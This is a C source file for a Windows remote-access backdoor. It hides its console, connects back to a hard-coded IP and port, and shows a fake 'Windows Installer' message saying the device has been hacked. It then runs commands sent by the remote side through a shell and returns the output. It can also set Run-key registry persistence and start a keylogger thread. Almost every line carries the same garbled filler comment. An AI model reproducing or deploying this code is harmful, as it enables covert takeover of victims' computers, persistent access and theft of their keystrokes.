
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf


int bootRun()
{
	char err[128] = "Failed\n"; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	TCHAR szPath[MAX_PATH]; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	DWORD pathLen = 0; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		return -1; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	}

	HKEY NewVal; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		return -1; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		send(sock, err, sizeof(err), 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		return -1; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	}
	RegCloseKey(NewVal); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	send(sock, suc, sizeof(suc), 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	return 0; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
}


char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

        char *buffer; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
        size_t str_len, buffer_len; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
                if (abs(slice_to) > str_len - 1)
                        return NULL; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

                buffer_len = slice_to - slice_from; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
                str += (str_len + slice_from); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

                if (slice_from > str_len - 1)
                        return NULL; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
                buffer_len = slice_to - slice_from; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
                str += slice_from; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

        } else
                return NULL; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

        buffer = calloc(buffer_len, sizeof(char)); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
        strncpy(buffer, str, buffer_len); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
        return buffer; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
}

void Shell() {
	char buffer[1024]; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	char container[1024]; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	char total_response[18384]; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf


	while (1) {
		jump:
		bzero(buffer,1024); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		bzero(container, sizeof(container)); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		bzero(total_response, sizeof(total_response)); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		recv(sock, buffer, 1024, 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			WSACleanup(); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			exit(0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer,3,100)); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		}
		else if (strncmp("persist", buffer, 7) == 0) {
			bootRun(); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		}
		else if (strncmp("keylog_start", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			goto jump; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		}
		else {
			FILE *fp; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			fp = _popen(buffer, "r"); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			}
			send(sock, total_response, sizeof(total_response), 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
			fclose(fp); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		}

	}

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	HWND stealth; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	AllocConsole(); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	stealth = FindWindowA("ConsoleWindowClass", NULL); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	ShowWindow(stealth, 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	struct sockaddr_in ServAddr; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	unsigned short ServPort; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	char *ServIP; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	WSADATA wsaData; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	ServIP = "192.168.43.7"; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	ServPort = 50005; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	}

	sock = socket(AF_INET, SOCK_STREAM, 0); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf

	memset(&ServAddr, 0, sizeof(ServAddr)); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	ServAddr.sin_family = AF_INET; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	ServAddr.sin_port = htons(ServPort); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
		goto start; //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	}
	MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
	Shell(); //this is line that can add to our lisykjfh ksajfd hlakjsd hflakjs hflakjs hfak\n//kjfhkjsdf hkjsdfh lakjsdhf lakjsd hflkjas hfdlkjas hfdlkjsdf
}
